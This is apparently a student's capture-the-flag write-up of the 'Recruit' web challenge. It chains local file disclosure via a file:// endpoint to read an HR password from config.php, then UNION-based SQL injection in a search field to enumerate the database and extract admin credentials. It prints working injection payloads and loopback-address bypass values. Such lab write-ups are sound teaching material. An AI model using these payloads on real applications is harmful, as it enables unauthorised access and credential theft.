# Recruit — Penetration Testing Write-up

## Introduction

HI! I’m Rebeca, a **cybersecurity student currently beginning my practical journey in penetration testing**. This challenge represents my **first complete web application penetration testing exercise**, giving me the opportunity to apply concepts studied in theory to a realistic environment.

## Challenge Overview

The **Recruit** challenge presents a recruitment web application used by HR staff to manage candidate applications and by administrators to oversee hiring decisions.

The objective of the challenge is to approach the application as a penetration tester and determine whether security weaknesses can be chained together to obtain an initial foothold, escalate privileges, and ultimately gain access to the administrator account.

## 1. Initial Reconnaissance

The application exposed two main pages:

- The main application page.
- `api.php`, which documented the CV retrieval functionality.

The `api.php` page stated that CVs could be accessed through:

```
/file.php?cv=<URL>
```

It also indicated that the endpoint supported HTTP/HTTPS requests and that requests targeting restricted locations could be blocked.

This initially suggested a possible **Server-Side Request Forgery (SSRF)** vulnerability because the application appeared to accept a user-controlled URL that could potentially determine where the server made a request.

---

## 2. Directory Enumeration

Directory enumeration was performed using **Gobuster**.

Initial findings included:

```
/.htaccess          → 403
/.hta               → 403
/.htpasswd          → 403
/assets/             → 301
/index.php           → 200
/javascript/        → 301
/mail/               → 301
/phpmyadmin/         → 301
/server-status       → 403
/sitemap.xml         → 200
```

The following resources were considered particularly interesting:

- `/mail/`
- `/phpmyadmin/`
- `/server-status`
- `/sitemap.xml`

The presence of `/server-status` was particularly interesting because it could potentially expose internal Apache information if accessible.

---

# 3. SSRF Investigation

Based on the documentation in `api.php`, SSRF was investigated through the `cv` parameter.

An initial test attempted to access the local Apache status page:

```
/file.php?cv=http://127.0.0.1/server-status/
```

Several alternative representations of the loopback address were also tested:

| Technique | Value |
| --- | --- |
| Decimal | `2130706433` |
| Octal | `017700000001` |
| Shorthand | `127.1` |
| Shorthand | `0` |
| Shorthand | `0.0.0.0` |
| IPv6 | `[::1]` |
| DNS-based | `127.0.0.1.nip.io` |

All attempts returned:

```
Only local files are allowed
```

At this point, the behavior did not match a conventional HTTP-based SSRF.

---

# 4. Source Code Analysis — `file.php`

The source code of `file.php` was analyzed.

Its logic can be summarized as:

```
file.php
   ↓
Accept only file://
   ↓
Remove file://
   ↓
Resolve path using realpath()
   ↓
Require path to be inside /var/www/html
   ↓
Read file using file_get_contents()
   ↓
Return file contents
```

The first validation was:

```
if (strpos($cv, 'file://') !== 0) {
    die('Only local files are allowed');
}
```

The application then removed the `file://` prefix:

```
$filePath = str_replace('file://', '', $cv);
```

The resulting path was resolved using:

```
$realPath = realpath($filePath);
```

Finally, access was restricted to:

```
/var/www/html
```

and the file contents were returned with:

```
echo file_get_contents($realPath);
```

### Conclusion

The endpoint was **not performing HTTP SSRF as initially suspected**.

Instead, it implemented a local file-reading functionality using the `file://` scheme, with a directory restriction to:

```
/var/www/html
```

This changed the investigation from HTTP SSRF to **local file inclusion / local file disclosure**.

---

# 5. Further File Enumeration

A second enumeration was performed, focusing on potentially sensitive files and configuration files.

Relevant findings included:

```
/api.php             → 200
/config.php          → 200
/dashboard.php       → 302
/file.php            → 200
/footer.php          → 200
/header.php          → 200
/index.php           → 200
/logout.php          → 302
/mail/               → 301
/phpmyadmin/         → 301
/server-status       → 403
/sitemap.xml         → 200
```

Several variations of `.htaccess` and `.htpasswd` files were also tested, but they returned `403 Forbidden`.

---

# 6. `.htaccess` Analysis

The `.htaccess` file contained the following rules:

```
# RewriteCond %{REQUEST_FILENAME} !-d
# RewriteCond %{REQUEST_URI} !^/(assets|$)
# RewriteRule ^ - [F]
```

These rules appeared to be intended to restrict access to directories.

However, they were commented out using `#`.

Therefore, **these restrictions were not active**.

The active directive:

```
Options -Indexes
```

does not prevent access to directories. It only prevents Apache from displaying an automatic directory listing when no index file is available.

The `.htaccess` also contained an active rewrite rule that allowed requests without the `.php` extension to be internally mapped to the corresponding PHP file when that file existed.

---

# 7. `config.php` Disclosure

The enumeration identified:

```
/config.php → HTTP 200
```

with a response size of zero bytes.

A zero-byte HTTP response did not necessarily mean that the PHP file itself was empty. Because PHP executes the file before returning the response, a configuration file containing only variable assignments could produce an empty response.

Using the local file-reading functionality, the source of `config.php` was obtained.

The configuration contained a temporary HR credential:

```
$HR_PASSWORD = '[REDACTED]';
```

> **Sensitive information redacted.**
> 

The discovered credential was used with the `hr` account to obtain the initial authenticated access to the application.

---

# 8. Initial Access

The credentials obtained from `config.php` allowed authentication as:

```
Username: hr
Password: [REDACTED]
```

After authentication, additional application functionality became available.

A search field was identified as an interesting input point.

---

# 9. SQL Injection Discovery

Testing the search functionality produced a MySQL syntax error:

```
SQL Error:
You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version
for the right syntax to use near '%'' at line 1
```

This indicated that user-controlled input was being incorporated into an SQL query without proper parameterization.

The search field was therefore identified as a potential **SQL Injection** point.

---

# 10. Determining the Number of Columns

The following payload was used:

```
' ORDER BY 1#
```

By incrementing the `ORDER BY` value, the number of columns in the original query was determined to be:

```
4 columns
```

This allowed `UNION SELECT` queries to be constructed with the correct number of columns.

---

# 11. Database Version Enumeration

The following query was used:

```
' UNION SELECT version(), 2, 3, 4#
```

The database version was identified as:

```
MySQL 8.0.33-0ubuntu0.20.04.2
```

---

# 12. Database Enumeration

The current database was identified using:

```
' UNION SELECT database(), 2, 3, 4#
```

Result:

```
recruit_db
```

---

# 13. Table Enumeration

The MySQL `information_schema` database was queried to enumerate tables:

```
' UNION SELECT
group_concat(table_name),
2,
3,
4
FROM information_schema.tables
WHERE table_schema = 'recruit_db'#
```

The following tables were identified:

```
candidates
users
```

The `users` table was particularly relevant because it was likely associated with application authentication.

---

# 14. Column Enumeration

The columns of the `users` table were enumerated using:

```
' UNION SELECT
group_concat(column_name),
2,
3,
4
FROM information_schema.columns
WHERE table_name = 'users'#
```

Relevant columns included:

```
id
username
password
```

Additional MySQL connection-related columns were also returned.

---

# 15. Credential Extraction

The following query was used to retrieve the usernames and passwords:

```
' UNION SELECT
group_concat(username, ':', password SEPARATOR '<br>'),
2,
3,
4
FROM users#
```

The query returned credentials belonging to an administrative account.

> **Administrative credentials redacted.**
> 

These credentials allowed the assessment to progress from the initially compromised HR account to the application's administrative account.

---

# 16. Attack Chain

The complete attack path identified so far can be summarized as:

```
Initial Reconnaissance
        ↓
Gobuster Directory Enumeration
        ↓
Identify file.php
        ↓
Analyze file.php
        ↓
Local File Disclosure via file://
        ↓
Identify /var/www/html restriction
        ↓
Discover config.php
        ↓
Read config.php
        ↓
Obtain HR credentials
        ↓
Authenticate as HR
        ↓
Identify Search Functionality
        ↓
SQL Injection
        ↓
Determine 4 Columns
        ↓
Identify MySQL Version
        ↓
Identify recruit_db
        ↓
Enumerate Tables
        ↓
Identify users
        ↓
Enumerate Columns
        ↓
Identify username/password
        ↓
Obtain Administrative Credentials
        ↓
Administrative Access
```

---

# 17. Vulnerabilities Identified

### 1. Sensitive configuration exposure

`config.php` was located inside the web application's accessible directory and contained a credential in plaintext.

### 2. Local file disclosure

`file.php` allowed users to retrieve files from `/var/www/html` using the `file://` scheme.

Although a directory restriction existed, sensitive files located inside the allowed directory remained accessible.

### 3. SQL Injection

The search functionality incorporated user-controlled input into an SQL query without adequate parameterization.

The vulnerability allowed:

- Determining the number of columns.
- Identifying the database engine and version.
- Identifying the active database.
- Enumerating tables.
- Enumerating columns.
- Extracting database records.
- Obtaining application credentials.

### 4. Plaintext credentials

Credentials were stored directly in the application's configuration and database rather than being appropriately protected.

---

## Attack Flow — Short Version

```
Local File Disclosure
        ↓
config.php
        ↓
HR Credentials
        ↓
HR Account
        ↓
Search Function
        ↓
SQL Injection
        ↓
information_schema
        ↓
users Table
        ↓
Credentials
        ↓
Administrator
```